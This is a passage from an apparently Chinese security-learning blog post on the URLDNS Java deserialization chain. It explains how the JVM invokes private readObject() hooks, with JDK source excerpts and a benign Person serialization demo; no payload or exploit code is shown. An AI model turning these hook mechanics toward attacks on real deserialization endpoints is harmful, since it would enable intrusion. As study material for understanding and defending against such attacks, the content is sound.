unserialize($data) 方法（不是 __wakeup()）。</span><br></pre></td></tr></table></figure><h3 id="小总结"><a href="#小总结" class="headerlink" title="小总结"></a>小总结</h3><img src="/2025/07/15/URLDNS%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE-%E4%BB%8E%E7%99%BE%E8%8D%89%E5%9B%AD%E5%86%99%E5%88%B0%E4%B8%89%E5%91%B3%E4%B9%A6%E5%B1%8B/4.png" class=""><ul><li>所有变量和方法会被调用吗？不会，仅调用特定钩子方法（如 <code>readObject()</code> &#x2F; <code>__wakeup()</code> &#x2F; <code>__reduce__()</code> 等）</li><li>哪些语言反序列化最危险？Java、PHP、Python、.NET 都很危险</li><li>有什么安全语言或机制？JSON &#x2F; YAML &#x2F; Protocol Buffers（如果不带执行逻辑）相对安全</li><li>是否所有语言都跳过构造函数？不全是，例如 Ruby 会调用构造函数，.NET 有条件调用</li></ul><p>那么为什么hashMap自己重写的readObject会在反序列化的时候被调用？</p><p><strong>因为 Java 的反序列化机制中规定：</strong><br>如果某个类定义了 <code>private void readObject(ObjectInputStream in)</code> 方法，反序列化时，JVM 会优先调用这个方法来自定义恢复过程，而不是使用默认机制。</p><h2 id="特别强调"><a href="#特别强调" class="headerlink" title="特别强调"></a>特别强调</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#必须要是</span><br><span class="line">private void readObject(ObjectInputStream in)</span><br><span class="line">    throws IOException, ClassNotFoundException</span><br><span class="line">#如果签名不对，JVM 就不会认这个方法，更不会自动调用</span><br></pre></td></tr></table></figure><h2 id="特殊签名"><a href="#特殊签名" class="headerlink" title="特殊签名"></a>特殊签名</h2><p>private void readObject(ObjectInputStream in) throws IOException, ClassNotFoundException<br>感觉这个也是很随意的呀，哪里看得出固定签名？</p><p>它之所以能被 JVM 反序列化机制自动调用，完全是因为它的“签名”被严格规定在了 <mark>Java 的序列化协议中</mark>，不是靠注解、接口、继承，而是靠 Java 语言规范和 <code>ObjectInputStream</code> 的源码 (反射)实现的。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br></pre></td><td class="code"><pre><span class="line">private void readSerialData(Object obj, ObjectStreamClass desc)throws IOException</span><br><span class="line"></span><br><span class="line">    &#123;</span><br><span class="line"></span><br><span class="line">        ObjectStreamClass.ClassDataSlot[] slots = desc.getClassDataLayout();</span><br><span class="line"></span><br><span class="line">        for (int i = 0; i &lt; slots.length; i++) &#123;</span><br><span class="line"></span><br><span class="line">            ObjectStreamClass slotDesc = slots[i].desc;</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line">            if (slots[i].hasData) &#123;</span><br><span class="line"></span><br><span class="line">                if (obj == null || handles.lookupException(passHandle) != null) &#123;</span><br><span class="line"></span><br><span class="line">                    defaultReadFields(null, slotDesc); // skip field values</span><br><span class="line"></span><br><span class="line">//这里的if判断段是核心结构</span><br><span class="line">                &#125; else if (slotDesc.hasReadObjectMethod()) &#123;</span><br><span class="line"></span><br><span class="line">                    ThreadDeath t = null;</span><br><span class="line"></span><br><span class="line">                    boolean reset = false;</span><br><span class="line"></span><br><span class="line">                    SerialCallbackContext oldContext = curContext;</span><br><span class="line"></span><br><span class="line">                    if (oldContext != null)</span><br><span class="line"></span><br><span class="line">                        oldContext.check();</span><br><span class="line"></span><br><span class="line">                    try &#123;</span><br><span class="line"></span><br><span class="line">                        curContext = new SerialCallbackContext(obj, slotDesc);</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line">                        bin.setBlockDataMode(true);</span><br><span class="line"></span><br><span class="line">                        slotDesc.invokeReadObject(obj, this);</span><br><span class="line"></span><br><span class="line">                    &#125; catch (ClassNotFoundException ex) &#123;</span><br><span class="line"></span><br><span class="line">                        /*</span><br><span class="line"></span><br><span class="line">                         * In most cases, the handle table has already</span><br><span class="line"></span><br><span class="line">                         * propagated a CNFException to passHandle at this</span><br><span class="line"></span><br><span class="line">                         * point; this mark call is included to address cases</span><br><span class="line"></span><br><span class="line">                         * where the custom readObject method has cons&#x27;ed and</span><br><span class="line"></span><br><span class="line">                         * thrown a new CNFException of its own.</span><br><span class="line"></span><br><span class="line">                         */</span><br><span class="line"></span><br><span class="line">                        handles.markException(passHandle, ex);</span><br><span class="line"></span><br><span class="line">                    &#125; finally &#123;</span><br><span class="line"></span><br><span class="line">                        do &#123;</span><br><span class="line"></span><br><span class="line">                            try &#123;</span><br><span class="line"></span><br><span class="line">                                curContext.setUsed();</span><br><span class="line"></span><br><span class="line">                                if (oldContext!= null)</span><br><span class="line"></span><br><span class="line">                                    oldContext.check();</span><br><span class="line"></span><br><span class="line">                                curContext = oldContext;</span><br><span class="line"></span><br><span class="line">                                reset = true;</span><br><span class="line"></span><br><span class="line">                            &#125; catch (ThreadDeath x) &#123;</span><br><span class="line"></span><br><span class="line">                                t = x;  // defer until reset is true</span><br><span class="line"></span><br><span class="line">                            &#125;</span><br><span class="line"></span><br><span class="line">                        &#125; while (!reset);</span><br><span class="line"></span><br><span class="line">                        if (t != null)</span><br><span class="line"></span><br><span class="line">                            throw t;</span><br><span class="line"></span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line">                    /*</span><br><span class="line"></span><br><span class="line">                     * defaultDataEnd may have been set indirectly by custom</span><br><span class="line"></span><br><span class="line">                     * readObject() method when calling defaultReadObject() or</span><br><span class="line"></span><br><span class="line">                     * readFields(); clear it to restore normal read behavior.</span><br><span class="line"></span><br><span class="line">                     */</span><br><span class="line"></span><br><span class="line">                    defaultDataEnd = false;</span><br><span class="line"></span><br><span class="line">                &#125; else &#123;</span><br><span class="line"></span><br><span class="line">                    defaultReadFields(obj, slotDesc);</span><br><span class="line"></span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line">                if (slotDesc.hasWriteObjectData()) &#123;</span><br><span class="line"></span><br><span class="line">                    skipCustomData();</span><br><span class="line"></span><br><span class="line">                &#125; else &#123;</span><br><span class="line"></span><br><span class="line">                    bin.setBlockDataMode(false);</span><br><span class="line"></span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">            &#125; else &#123;</span><br><span class="line"></span><br><span class="line">                if (obj != null &amp;&amp;</span><br><span class="line"></span><br><span class="line">                    slotDesc.hasReadObjectNoDataMethod() &amp;&amp;</span><br><span class="line"></span><br><span class="line">                    handles.lookupException(passHandle) == null)</span><br><span class="line"></span><br><span class="line">                &#123;</span><br><span class="line"></span><br><span class="line">                    slotDesc.invokeReadObjectNoData(obj);</span><br><span class="line"></span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line">    /**</span><br><span class="line">    </span><br></pre></td></tr></table></figure><p>我贴的很全(   但是不要全看，只看今天着重强调的部分</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">if (slots[i].hasData) &#123;</span><br><span class="line">            if (slotDesc.hasReadObjectMethod()) &#123;</span><br><span class="line">                // 核心调用：反射调用 readObject()</span><br><span class="line">                slotDesc.invokeReadObject(obj, this);</span><br><span class="line">            &#125; else &#123;</span><br><span class="line">            //否则执行默认反序列化</span><br><span class="line">                defaultReadFields(obj, slotDesc);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">//那么hasReadObjectMethod()做了什么呢？</span><br><span class="line">    boolean hasReadObjectMethod() &#123;</span><br><span class="line"></span><br><span class="line">        requireInitialized();</span><br><span class="line"></span><br><span class="line">        return (readObjectMethod != null);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">//那么requireInitialized又是什么呢()</span><br><span class="line"></span><br><span class="line">    private final void requireInitialized() &#123;</span><br><span class="line">//确保ObjectStreamClass已经完成初始化，已经扫描过是否存在readObject()等方法</span><br><span class="line">        if (!initialized)</span><br><span class="line"></span><br><span class="line">            throw new InternalError(&quot;Unexpected call when not initialized&quot;);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>为了防止越写越多导致不明所以，在此直接写下流程<br>以下是你写的测试代码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">class A implements Serializable &#123;</span><br><span class="line">    private String name;</span><br><span class="line">    private void readObject(ObjectInputStream in) throws IOException, ClassNotFoundException &#123;</span><br><span class="line">        in.defaultReadObject();</span><br><span class="line">        System.out.println(&quot;我是自定义readObject&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><ul><li><p>如果你定义了这个方法：</p><ul><li><code>getPrivateMethod(...)</code> 会找到它并赋值给 <code>readObjectMethod</code></li><li><code>hasReadObjectMethod()</code> 返回 true → <code>invokeReadObject()</code> 会调用它</li></ul></li><li><p>如果你没写或写错签名（比如是 public、参数不是 ObjectInputStream）：</p><ul><li><code>readObjectMethod == null</code> → <code>hasReadObjectMethod()</code> 返回 false → 自动走默认反序列化</li></ul></li></ul><p>这里的getPrivateMethod()是如何进行查找的，invokeReadObject()是如何进行调用的 便不再论述</p><h2 id="特别钩子"><a href="#特别钩子" class="headerlink" title="特别钩子"></a>特别钩子</h2><p>类似于PHP的魔术方法(因为本人先学的php所以捏他一个php的”魔术方法“)<br>这些方法本质上确实就是 Java 的魔术方法：</p><table><thead><tr><th>方法签名</th><th>触发阶段</th><th>用途</th><th>调用者源码位置</th></tr></thead><tbody><tr><td><code>private void readObject(ObjectInputStream in)</code></td><td>反序列化时</td><td>自定义字段读取、逻辑处理</td><td><code>ObjectStreamClass.invokeReadObject(...)</code></td></tr><tr><td><code>private void readObjectNoData()</code></td><td>反序列化但类无数据时</td><td>处理版本不兼容情况</td><td><code>ObjectStreamClass.invokeReadObjectNoData(...)</code></td></tr><tr><td><code>private Object readResolve()</code></td><td>反序列化完成后</td><td>替换反序列化结果对象</td><td><code>ObjectInputStream.readObject0()</code></td></tr><tr><td><code>private void writeObject(ObjectOutputStream out)</code></td><td>序列化时</td><td>自定义字段写出、控制序列化内容</td><td><code>ObjectStreamClass.invokeWriteObject(...)</code></td></tr><tr><td><code>private Object writeReplace()</code></td><td>序列化前</td><td>替换待序列化对象</td><td><code>ObjectOutputStream.writeObject0()</code></td></tr></tbody></table><h1 id="关于defaultReadObject-函数功能的说明"><a href="#关于defaultReadObject-函数功能的说明" class="headerlink" title="关于defaultReadObject()函数功能的说明"></a>关于defaultReadObject()函数功能的说明</h1><p>如果你真的去进行了尝试，就会遇到defaultReadObject()这个函数，那么它又是谁，发挥了什么作用呢？</p><h2 id="从一个例子开始"><a href="#从一个例子开始" class="headerlink" title="从一个例子开始"></a>从一个例子开始</h2><p>这里有如下两个代码程序：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><span class="line">#Person.java</span><br><span class="line">import java.io.*;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">public class Person implements Serializable &#123;</span><br><span class="line"></span><br><span class="line">    private String name;</span><br><span class="line"></span><br><span class="line">    private int age;</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line"></span><br><span class="line">    // 添加这个构造方法就能匹配 &quot;Alice&quot;, 30</span><br><span class="line"></span><br><span class="line">    public Person(String name, int age) &#123;</span><br><span class="line"></span><br><span class="line">        this.name = name;</span><br><span class="line"></span><br><span class="line">        this.age = age;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line"></span><br><span class="line">    private void readObject(ObjectInputStream in)</span><br><span class="line"></span><br><span class="line">            throws IOException, ClassNotFoundException &#123;</span><br><span class="line"></span><br><span class="line">        //in.defaultReadObject(); // 必须写！</span><br><span class="line"></span><br><span class="line">        System.out.println(&quot;反序列化后，name = &quot; + name + &quot;, age = &quot; + age);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">#TestPersion.java</span><br><span class="line">import java.io.*;</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line">public class TestPerson &#123;</span><br><span class="line"></span><br><span class="line">    public static void main(String[] args) throws Exception &#123;</span><br><span class="line"></span><br><span class="line">        // 序列化 Person 对象</span><br><span class="line"></span><br><span class="line">        Person p = new Person(&quot;Alice&quot;, 30);</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line">        FileOutputStream fos = new FileOutputStream(&quot;person.ser&quot;);</span><br><span class="line"></span><br><span class="line">        ObjectOutputStream oos = new ObjectOutputStream(fos);</span><br><span class="line"></span><br><span class="line">        oos.writeObject(p);</span><br><span class="line"></span><br><span class="line">        oos.close();</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line">        System.out.println(&quot;对象已序列化。&quot;);</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line">        // 反序列化 Person 对象</span><br><span class="line"></span><br><span class="line">        FileInputStream fis = new FileInputStream(&quot;person.ser&quot;);</span><br><span class="line"></span><br><span class="line">        ObjectInputStream ois = new ObjectInputStream(fis);</span><br><span class="line"></span><br><span class="line">        Person p2 = (Person) ois.readObject(); // 此处会触发 readObject</span><br><span class="line"></span><br><span class="line">        ois.close();</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line">        System.out.println(&quot;对象已反序列化。&quot;);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><span class="line">#Person.java</span><br><span class="line">import java.io.*;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">public class Person implements Serializable &#123;</span><br><span class="line"></span><br><span class="line">    private String name;</span><br><span class="line"></span><br><span class="line">    private int age;</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line"></span><br><span class="line">    //  添加这个构造方法就能匹配 &quot;Alice&quot;, 30</span><br><span class="line"></span><br><span class="line">    public Person(String name, int age) &#123;</span><br><span class="line"></span><br><span class="line">        this.name = name;</span><br><span class="line"></span><br><span class="line">        this.age = age;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line"></span><br><span class="line">    private void readObject(ObjectInputStream in)</span><br><span class="line"></span><br><span class="line">            throws IOException, ClassNotFoundException &#123;</span><br><span class="line"></span><br><span class="line">        //in.defaultReadObject(); // 必须写！</span><br><span class="line"></span><br><span class="line">        System.out.println(&quot;反序列化后，name = &quot; + name + &quot;, age = &quot; + age);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">#TestPersion.java</span><br><span class="line">import java.io.*;</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line">public class TestPerson &#123;</span><br><span class="line"></span><br><span class="line">    public static void main(String[] args) throws Exception &#123;</span><br><span class="line"></span><br><span class="line">        //  序列化 Person 对象</span><br><span class="line"></span><br><span class="line">        Person p = new Person(&quot;Alice&quot;, 30);</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line">        FileOutputStream fos = new FileOutputStream(&quot;person.ser&quot;);</span><br><span class="line"></span><br><span class="line">        ObjectOutputStream oos = new ObjectOutputStream(fos);</span><br><span class="line"></span><br><span class="line">        oos.writeObject(p);</span><br><span class="line"></span><br><span class="line">        oos.close();</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line">        System.out.println(&quot;对象已序列化。&quot;);</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line">        //  反序列化 Person 对象</span><br><span class="line"></span><br><span class="line">        FileInputStream fis = new FileInputStream(&quot;person.ser&quot;);</span><br><span class="line"></span><br><span class="line">        ObjectInputStream ois = new ObjectInputStream(fis);</span><br><span class="line"></span><br><span class="line">        Person p2 = (Person) ois.readObject(); // 此处会触发 readObject</span><br><span class="line"></span><br><span class="line">        ois.close();</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line">        System.out.println(&quot;对象已反序列化。&quot;);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>前者运行结果为</p><img src="/2025/07/15/URLDNS%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE-%E4%BB%8E%E7%99%BE%E8%8D%89%E5%9B%AD%E5%86%99%E5%88%B0%E4%B8%89%E5%91%B3%E4%B9%A6%E5%B1%8B/5.png" class=""><p>后者运行结果为</p><img src="/2025/07/15/URLDNS%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE-%E4%BB%8E%E7%99%BE%E8%8D%89%E5%9B%AD%E5%86%99%E5%88%B0%E4%B8%89%E5%91%B3%E4%B9%A6%E5%B1%8B/6.png" class=""><p>两个代码程序实现的都是在Person.java中继承序列化写一个Person对象，然后重写readObject()函数，在TestPerson主程序中序列化Person对象，然后进行反序列化输出结果</p><p>但问题出在<mark>代码程序的第一个Person.java前者注释掉了defaultReadObject()而后者没有</mark></p><p>别急，这不是一句废话，这说明defaultReadObject()函数是 Java 序列化协议中约定的方法，没有它，对象字段就不会被正常恢复，用于将对象的非 transient、非 static 字段从输入流中恢复成当前对象的实际值</p><h2 id="结合源码来深入分析"><a href="#结合源码来深入分析" class="headerlink" title="结合源码来深入分析"></a>结合源码来深入分析</h2><p>结合源码来看，将讲解标记在注释里面</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">#defaultReadObject()源码</span><br><span class="line">public void defaultReadObject()</span><br><span class="line">        throws IOException, ClassNotFoundException</span><br><span class="line">&#123;</span><br><span class="line">    // 从当前线程上下文中获取序列化上下文对象（当前正在反序列化哪个对象）</span><br><span class="line">    SerialCallbackContext ctx = curContext;</span><br><span class="line">    if (ctx == null) &#123;</span><br><span class="line">        // 如果当前不是在 readObject() 中调用，则抛异常</span><br><span class="line">        throw new NotActiveException(&quot;not in call to readObject&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // 获取当前对象和它的类描述符</span><br><span class="line">    Object curObj = ctx.getObj();           // 当前正在反序列化的对象</span><br><span class="line">    ObjectStreamClass curDesc = ctx.getDesc(); // 它的序列化类描述符</span><br><span class="line"></span><br><span class="line">    // 设置读取模式为非块模式（即从当前流中按字段读取）</span><br><span class="line">    bin.setBlockDataMode(false);</span><br><span class="line"></span><br><span class="line">    // 关键：读取并恢复对象的字段</span><br><span class="line">    defaultReadFields(curObj, curDesc); // 核心逻辑：把字段值写入对象</span><br><span class="line"></span><br><span class="line">    // 恢复数据块模式（恢复为 block 模式）</span><br><span class="line">    bin.setBlockDataMode(true);</span><br><span class="line"></span><br><span class="line">    // 如果序列化数据中不含 writeObject 写入的内容（没有 TC_ENDBLOCKDATA）</span><br><span class="line">    if (!curDesc.hasWriteObjectData()) &#123;</span><br><span class="line">        // 模拟“读取完自定义数据块”的标志，供后续使用</span><br><span class="line">        defaultDataEnd = true;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // 如果这个对象在 handle 表中有记录异常，就重新抛出</span><br><span class="line">    ClassNotFoundException ex = handles.lookupException(passHandle);</span><br><span class="line">    if (ex != null) &#123;</span><br><span class="line">        throw ex;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这段代码可以看到他是使用defauleReadFields()核心函数读取字段值并且赋值给当前对象，于是我们继续深入核心ObjectInputStream.defaultReadFields()</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span 